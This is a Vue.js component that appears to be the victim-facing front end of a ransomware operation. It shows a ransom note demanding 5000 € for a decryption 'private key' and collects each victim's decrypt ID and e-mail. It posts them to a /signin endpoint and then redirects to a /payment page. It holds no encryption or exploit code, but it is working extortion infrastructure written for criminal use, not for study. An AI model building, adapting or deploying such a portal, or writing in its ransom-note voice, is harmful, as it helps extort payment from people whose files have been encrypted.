<template>
    <div class="form_page pt-2">
        <div class="card w-40">
            <form class="card-form" @submit.prevent="submit(user)">
                <p v-if="error" class="card-error">
                    {{ error }}
                </p>
                <div class="input">
                    <input type="text" class="input-field" v-model="user.decryptId" placeholder="Decrypt ID" required/>
                </div>
                <div class="input">
                    <input type="text" class="input-field" v-model="user.email" placeholder="E-mail" required/>
                </div>
                <div class="action flex_form_group">
                    <button class="action-button inline">SUBMIT</button>
                </div>
            </form>
            <div class="title title--caption">
                <FlashMessage
                    type="error"
                >
                    <h2 class="title-label medium">
                        Attention ! <br/>
                        Price of software and your private key is <strong>5000 €</strong>. With this product you can decrypt all your files, if your are willing to pay for a software product, then: <br/><br/>
                        Deer user, <br/>
                        Leave your decrypt id and email. We will contact you within twenty four hours and give further instructions. <br/>
                        You do not need to leave different electronic addresses or the same address many time
                    </h2>
                </FlashMessage>
            </div>
        </div>
    </div>
</template>

<script lang="ts">
import { defineComponent } from 'vue';
import HttpRequest from "../core/services/http/HttpRequest";
import FlashMessage from "../components/FlashMessage.vue";

export default defineComponent({
    name: 'Signin',
    components: {FlashMessage},
    data() {
        return {
            user: {
                email: null,
                decryptId: null
            },
            error: null as string | null
        }
    },
    methods: {
        submit(user: any): void {
            HttpRequest.post('/signin', user)
                .then((response: any) => {
                    if(response.data.success) {
                        sessionStorage.setItem('decryptId', response.data.decryptId)
                        this.$router.push('/payment')
                    } else {
                        this.error = response.data.data
                    }
                })
                .catch((error : any) => {
                    this.error = error.response.data.message;
                });
        }
    }
});
</script>

<style lang="scss" scoped>

</style>
